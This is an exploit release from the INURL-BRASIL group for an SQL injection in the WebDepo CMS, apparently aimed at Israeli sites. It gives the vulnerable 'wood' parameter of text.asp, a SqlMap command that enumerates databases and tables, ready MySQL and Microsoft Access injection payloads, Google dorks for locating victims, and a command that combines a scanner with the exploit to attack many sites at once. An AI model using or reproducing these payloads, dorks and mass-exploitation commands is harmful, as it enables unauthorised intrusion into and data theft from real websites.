- 0DAY WebDepo SQL injection /INURL-BRASIL
------
>MINI 3xplo1t-SqlMap - (0DAY) WebDepo -SQL injection

```
  # AUTOR:        Cleiton Pinheiro / Nick: googleINURL
  # Blog:         http://blog.inurl.com.br
  # Twitter:      https://twitter.com/googleinurl
  # Fanpage:      https://fb.com/InurlBrasil
  # Pastebin      http://pastebin.com/u/Googleinurl
  # GIT:          https://github.com/googleinurl
  # PSS:          http://packetstormsecurity.com/user/googleinurl
  # YOUTUBE:      http://youtube.com/c/INURLBrasil
  # PLUS:         http://google.com/+INURLBrasil
```
-   VENTOR:       http://www.webdepot.co.il

-   Vulnerability Description
------
Records and client practice management application
CMS WebDepo suffers from multiple SQL injection vulnerabilitie.

-   Tool Description
------
Automation script explores targets with the help of SqlMap tool
Execute command SqlMap
```
python {$params['folder']} -u '{$params['target']}/text.asp?wood=1' -p wood --batch --dbms=MySQL {$params['proxy']} --random-agent --answers='follow=N' --dbs --tables
```
- GET VULN
------
SQL can be injected in the following GET
```
GET VULN:     wood=(id)
$wood=intval($_REQUEST['wood'])
Ex: http://target.us/text.asp?wood=1
``` 
  
- XPL inject DBMS: 'MySQL'
------
```
Exploit:  +AND+(SELECT 8880 FROM(SELECT COUNT(*),CONCAT(0x496e75726c42726173696c,0x3a3a,version(),(SELECT (CASE WHEN (8880=8880) THEN 1 ELSE 0 END)),0x717a727a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
http://target.us/text.asp?wood=(id)+Exploit
``` 

- XPL inject DBMS: 'Microsoft Access'
------
```
Exploit: +UNION+ALL+SELECT+NULL,NULL,NULL,CHR(113)&CHR(112)&CHR(120)&CHR(112)&CHR(113)&CHR(85)&CHR(116)&CHR(106)&CHR(110)&CHR(108)&CHR(90)&CHR(74)&CHR(113)&CHR(88)&CHR(116)&CHR(113)&CHR(118)&CHR(111)&CHR(100)&CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM MSysAccessObjects%16
http://target.us/text.asp?wood=(id)+Exploit
``` 

- GOOGLE DORK
------
```
inurl:"text.asp?wood="
site:il inurl:"text.asp?wood="
site:com inurl:"text.asp?wood="
```

- COMMAND --help:
------
```
   -t : SET TARGET.
   -f : SET FILE TARGETS.
   -p : SET PROXY
   Execute:
                 php WebDepoxpl.php -t target
                 php WebDepoxpl.php -f targets.txt
                 php WebDepoxpl.php -t target -p 'http://localhost:9090'
```
 
- EXPLOIT MASS USE SCANNER INURLBR
------
``` 
./inurlbr.php --dork 'inurl:text.asp?wood=' -s 0dayWebDepo.txt -q 1,6 --exploit-get "?´'0x27" --comand-vul "php WebDepoxpl.php -t '_TARGET_'"
``` 

- DOWNLOAD INURLBR
------
https://github.com/googleinurl/SCANNER-INURLBR

- REFERENCE
------
[1] http://blog.inurl.com.br/2015/03/0day-webdepo-sql-injection.html
[2] https://msdn.microsoft.com/en-us/library/ff648339.aspx
 
